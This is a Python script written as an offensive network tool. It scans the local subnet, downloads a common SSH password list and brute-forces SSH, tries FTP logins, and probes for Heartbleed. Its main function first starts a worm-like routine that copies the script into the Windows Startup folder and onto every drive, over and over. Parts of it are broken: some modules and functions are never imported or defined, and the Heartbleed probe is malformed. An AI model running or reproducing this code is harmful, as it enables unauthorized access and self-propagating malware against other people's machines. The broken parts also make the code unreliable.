import os
import socket
import threading
import time
import nmap
import paramiko
import ftplib
import urllib.request
import netifaces
import coloredlogs
import logging
import ssl
from shutil import copy2

# Initialize logging
coloredlogs.install(fmt='%(message)s', level='DEBUG')
logger = logging.getLogger(__name__)

# Get the gateway of the network
gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]

def scan_hosts(ports):
    """
    Scans all machines on the same network that have the specified ports enabled.
    Returns:
        Dictionary containing IP addresses of hosts with open ports
    """
    logger.debug(f"Scanning machines on the same network with specified ports open: {ports}")
    port_scanner = nmap.PortScanner()
    port_scanner.scan(f"{gateway}/24", arguments=f'-p{ports} --open')
    hosts = port_scanner.all_hosts()
    open_ports = {}
    for host in hosts:
        open_ports[host] = []
        for port in port_scanner[host]['tcp'].keys():
            open_ports[host].append(port)
    logger.debug("Hosts with open ports: " + str(open_ports))
    return open_ports

def download_ssh_passwords(filename):
    """
    Downloads a list of common SSH passwords and saves it to a file.
    Args:
        filename: Name of the file to save passwords to
    """
    logger.debug("Downloading SSH passwords...")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
    urllib.request.urlretrieve(url, filename)
    logger.debug("SSH passwords downloaded!")

def connect_to_ftp(host, username, password):
    """
    Tries to connect to an FTP server.
    Args:
        host: FTP server IP
        username: FTP username
        password: FTP password
    """
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(username, password)
            logger.info(f"FTP login successful: {username}@{host}")
    except ftplib.all_errors as error:
        logger.error(f"FTP login failed: {error}")

def connect_to_ssh(host, username, password):
    """
    Tries to connect to an SSH server.
    Args:
        host: SSH server IP
        username: SSH username
        password: SSH password
    Returns:
        True if connection successful, False otherwise
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, 22, username, password, timeout=10)
        logger.info(f"SSH login successful: {username}@{host}")
        return True
    except (socket.error, paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException) as error:
        logger.error(f"SSH login failed: {error}")
        return False
    finally:
        client.close()

def bruteforce_ssh(host, username, wordlist):
    """
    Tries to brute-force an SSH server using a password list.
    Args:
        host: SSH server IP
        username: SSH username
        wordlist: Path to the password list file
    """
    try:
        with open(wordlist, "r") as file:
            for line in file:
                password = line.strip()
                if connect_to_ssh(host, username, password):
                    # If login successful, break out of the loop
                    break
                time.sleep(5)  # Add delay between attempts
    except FileNotFoundError:
        logger.error(f"Wordlist file not found: {wordlist}")

def check_heartbleed(host, port):
    """
    Checks if a server is vulnerable to Heartbleed.
    Args:
        host: IP address of the server
        port: Port number to check (typically 443 for HTTPS)
    """
    logger.debug(f"Checking Heartbleed vulnerability on {host}:{port}...")
    try:
        ssl_context = ssl.create_default_context()
        with socket.create_connection((host, port)) as sock:
            with ssl_context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.sendall(b'\x18\x03\x02\x00\x03\x01\x40')
                response = ssock.recv(100)
                if b'\x18\x03\x03' in response:
                    logger.info(f"Heartbleed vulnerability found on {host}:{port}")
                else:
                    logger.info(f"{host}:{port} is not vulnerable to Heartbleed")
    except Exception as e:
        logger.error(f"Error checking Heartbleed vulnerability on {host}:{port}: {e}")

def banner_grabbing(host, port):
    """
    Grabs the banner of a service running on a specific port.
    Args:
        host: IP address of the host
        port: Port number to grab banner from
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(b'GET / HTTP/1.1\r\n\r\n')
            banner = s.recv(1024)
            logger.info(f"Banner from {host}:{port}: {banner.decode().strip()}")
    except Exception as e:
        logger.error(f"Error grabbing banner from {host}:{port}: {e}")

def dns_enum(domain):
    """
    Enumerates DNS records for a domain.
    Args:
        domain: Domain name to enumerate DNS records for
    """
    try:
        records = dns.resolver.resolve(domain, 'A')
        for record in records:
            logger.info(f"A record for {domain}: {record}")
    except Exception as e:
        logger.error(f"Error enumerating DNS records for {domain}: {e}")




def drivespreading():
    """
    Copies the script to other drives on the computer.
    """
    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
    while True:
        drives = [drive for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]]
        for drive in drives:
            try:
                destination = bootfolder if drive == "C:\\" else drive
                copy2(__file__, destination)
            except Exception as error:
                logger.error(f"Error copying script to drive {drive}: {error}")
        time.sleep(3)

def start_drive_spreading():
    """
    Starts the drivespreading function as a threaded function.
    """
    thread = threading.Thread(target=drivespreading)
    thread.start()

def main():
    # Start spreading script to other drives
    start_drive_spreading()

    # Scan hosts on common ports
    ports = "21,22,80,443"  # Example of common ports
    hosts = scan_hosts(ports)
    logger.info(f"Hosts with open ports: {hosts}")

    # Download SSH passwords
    download_ssh_passwords("ssh_passwords.txt")

    # Connect to FTP server
    connect_to_ftp("ftp.example.com", "username", "password")

    # Brute-force SSH server
    bruteforce_ssh("ssh.example.com", "username", "ssh_passwords.txt")

    # Check for Heartbleed vulnerability
    check_heartbleed("example.com", 443)

    # Grab banners from open ports
    for host in hosts:
        for port in hosts[host]:
            banner_grabbing(host, port)

    # Perform DNS enumeration
    dns_enum("example.com")

    # Test SSL/TLS configuration
    ssl_config_test("example.com", 443)

if __name__ == "__main__":
    main()
